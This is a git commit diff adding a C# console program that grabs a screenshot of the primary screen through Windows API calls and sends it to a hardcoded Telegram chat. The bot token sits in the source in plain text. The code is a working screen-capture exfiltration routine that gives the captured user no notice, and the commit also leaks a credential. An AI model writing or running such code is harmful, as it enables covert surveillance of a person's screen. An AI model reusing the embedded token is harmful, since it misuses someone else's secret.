e28b063f0c7dec0647065b07c12b001796284cd6
berdikulov-571 <mygithub571@gmail.com>
2024-02-06 14:56:13 +0500

    Program.cs

--- WindowScreenshot.Console/Program.cs
+++ WindowScreenshot.Console/Program.cs
@@ -1,12 +1,64 @@
-﻿using System;
+﻿using System.Drawing.Imaging;
+using System.Drawing;
+using System.Runtime.InteropServices;
+using Telegram.Bot;
+using Telegram.Bot.Types.InputFiles;
+
 
 namespace WindowScreenshot
 {
     internal class Program
     {
-        static void Main(string[] args)
+        private static ITelegramBotClient _botClient;
+
+        static async Task Main(string[] args)
         {
-            Console.WriteLine();
+            _botClient = new TelegramBotClient("6530285040:AAFOZe4HLj89L-yHVkyJLKrtqO9H2PSpxx4");
+
+            Rectangle screenBounds = GetPrimaryScreenBounds();
+            using Bitmap screenshot = new(screenBounds.Width, screenBounds.Height);
+
+            using var graphics = Graphics.FromImage(screenshot);
+            graphics.CopyFromScreen(screenBounds.Location, Point.Empty, screenBounds.Size);
+
+            using var ms = new MemoryStream();
+            screenshot.Save(ms, ImageFormat.Png);
+            byte[] imageBytes = ms.ToArray();
+            var base64Image = Convert.ToBase64String(imageBytes);
+
+            _botClient.StartReceiving();
+
+            InputOnlineFile photo = new InputOnlineFile(new MemoryStream(imageBytes), "screnshoot.jpg");
+
+            await _botClient.SendPhotoAsync(2017110018,photo);
+        }
+
+        [DllImport("user32.dll")]
+        static extern IntPtr GetDesktopWindow();
+
+        [DllImport("user32.dll")]
+        static extern IntPtr GetDC(IntPtr hWnd);
+
+        [DllImport("user32.dll")]
+        static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
+
+        [DllImport("user32.dll")]
+        static extern int GetSystemMetrics(int nIndex);
+
+        public const int SM_CXSCREEN = 0;
+        public const int SM_CYSCREEN = 1;
+
+        static Rectangle GetPrimaryScreenBounds()
+        {
+            IntPtr desktopWindow = GetDesktopWindow();
+            IntPtr hdc = GetDC(desktopWindow);
+
+            int screenWidth = GetSystemMetrics(SM_CXSCREEN);
+            int screenHeight = GetSystemMetrics(SM_CYSCREEN);
+
+            ReleaseDC(desktopWindow, hdc);
+
+            return new Rectangle(0, 0, screenWidth, screenHeight);
         }
     }
 }
